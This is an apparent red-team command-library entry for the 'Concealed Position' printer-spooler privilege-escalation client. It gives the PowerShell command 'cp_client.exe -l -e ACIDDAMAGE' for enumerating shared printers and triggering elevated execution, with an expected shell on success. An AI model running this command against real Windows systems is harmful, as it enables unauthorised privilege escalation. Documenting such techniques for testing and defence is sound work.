---
id: f61bc0fd-0262-4a84-b597-b042a177a2eb
name: cp-client-list-with-name
type: command
executor: powershell
data: cp_client.exe -l -e ACIDDAMAGE
output: null
created_at: '2023-04-06T03:56:29.907723+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - enumeration
  - spooler
verified: true
validated: true
---

# cp-client-list-with-name

## Command

```powershell
cp_client.exe -l -e ACIDDAMAGE
```

## Description

Launches the Concealed Position client in list mode to enumerate shared printers and trigger elevated execution via the server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -l | List mode to display printers | Yes |
| -e | Execution name (e.g., ACIDDAMAGE) | Yes |

## Examples

### Basic Usage

```powershell
cp_client.exe -l -e ACIDDAMAGE
```

### Advanced Usage

With different name: `cp_client.exe -l -e CustomName`

## Expected Output

List of shared printers, potentially with a prompt or shell if escalation succeeds: "Printers: [list] Connected to server."

## Related

- [[procedures/Printer-Spooler-Service-Elevation-of-Privilege]]
